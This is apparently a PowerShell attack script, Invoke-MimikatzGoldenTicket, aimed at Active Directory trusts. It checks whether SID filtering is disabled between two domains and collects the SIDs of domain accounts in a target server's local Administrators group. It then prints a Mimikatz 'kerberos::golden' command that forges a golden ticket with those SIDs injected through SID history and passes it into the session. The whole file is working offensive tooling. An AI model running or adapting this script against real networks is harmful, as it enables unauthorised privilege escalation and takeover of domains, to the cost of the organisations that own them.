 Function Invoke-MimikatzGoldenTicket {

    <#
        dsa
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [String]
        $Domain,

        [Parameter(Mandatory=$true)]
        [String]
        $TargetDomain,

        [Parameter(Mandatory=$true)]
        [String]
        $TargetServer,

        [String]
        $UserName = "AttackerUser",

        [String]
        $krbtgt_hash = "00000000000000000000000000000000"
    )

    process {
        
        # Check if Domain exisits
        try {
            Write-Verbose "Getting Domain Information for $Domain"
            $Domain_Sid = ((ActiveDirectory\Get-ADDomain $Domain).DomainSID).value
            Write-Verbose "[*] Got Domain SID for $Domain ($Domain_Sid)"
        }
        catch {
            Write-Error "Can not find information for Domain: $Domain"
            return
        }
        
        # Check if TargetDomain exists
        try {
            Write-Verbose "Getting Domain Information for $TargetDomain"
            $TargetDomain_Sid = ((ActiveDirectory\Get-ADDomain $TargetDomain).DomainSID).value
            Write-Verbose "[*] Got Domain SID for $Target Domain ($TargetDomain_Sid)"
        }
        catch {
            Write-Error "Can not find information for Domain: $TargetDomain"
            return
        }

        ###########################################################################
        # Check if trust between Domain and TargetDomain exists
        $TrustExists = $True
        try {
            $Trust = ActiveDirectory\Get-ADTrust -Server $Domain -Identity $TargetDomain
        }
        catch {
            Write-Host "[!] Can not find trust between for $TargetDomain inside $Domain. Not able to check for SID Filtering status." -ForegroundColor DarkYellow
            $TrustExists = $False
        }

        if ($TrustExists) {
            # Check if SIDFiltering is disabled on the trust between Domain and TargetDomain
            if (($Trust.ForestTransitive) -and ($Trust.SidFilteringForestAware)) {
                Write-Host "[*] SID Filtering is disabled on the forest trust between $TargetServer and $TargetDomain" -ForegroundColor Green
            }
            elseif ((-not ($Trust.ForestTransitive)) -and (-not ($Trust.SIDFilteringQuarantined)) -and (-not ($Trust.IntraForest))) {
                Write-Host "[*] SID Filtering is disabled on the shortcut/external trust between $TargetServer and $TargetDomain. SID History attack should work!" -ForegroundColor Green
            }
            else {
                Write-Host "[!] SID Filtering is enabled on this trust. The SID History attack will not work" -ForegroundColor Red
            }
        }
        ###########################################################################

        # Check if TargetServer exists inside TargetDomain
        try {
            Write-Verbose "Checking for $TargetServer in $TargetDomain"
            ActiveDirectory\Get-ADComputer -Server $TargetDomain $TargetServer
            Write-Verbose "[*] Found $TargetServer in $TargetDomain"
        }
        catch {
            Write-Error "Can not find Server: $TargetServer in Domain: $TargetDomain. Ensure that the target server exists inside the target domain."
            return
        }

        # Grab the all Local Administrator memberships that are a Domain User or Group for the Target Server
        try {
            Write-Verbose "Getting Local Administrator memberships for $TargetServer"
            $Admins = [ADSI]"WinNT://$TargetServer/Administrators"
            $TargetUsers = @($Admins.psbase.Invoke("Members"))|foreach{$_.GetType().InvokeMember("Name",'GetProperty',$null,$_,$null)}
        }
        catch {
            Write-Error "Can not find local administrator membership for Server: $TargetServer"
            return
        }

        $UserSids = New-Object System.Collections.ArrayList
        ForEach ($TargetUser in $($TargetUsers -split "`r`n")) {
            Write-Verbose "Getting Domain SID for $TargetUser on $TargetDomain"
            $TargetUser_Sid = ((ActiveDirectory\Get-ADObject -Server $TargetDomain -Properties objectSid -Filter {SamAccountName -EQ $TargetUser}).objectSid).value
            if (-not ($TargetUser_Sid -eq $NULL)) {
                Write-Verbose "[*] Got Target User SID for $TargetUser ($TargetUser_Sid), admin of $TargetServer"
                $UserSids.add($TargetUser_Sid)
            }
        }
        $UserSids = $UserSids -join ','

        # Check if any domain accounts were found inside the local administrator group for TargetServer
        if ($UserSids -eq "" -or $UserSids -eq $NULL) {
            Write-Host "Could not find any Local Administrator domain accounts for $TargetServer"
        }
        else {
            Write-Host " "
            Write-Host "kerberos::golden /user:$UserName /domain:$Domain /sid:$Domain_Sid /krbtgt:$krbtgt_hash /sids:$UserSids /ptt"
            Write-Host " "
        }
    }
}
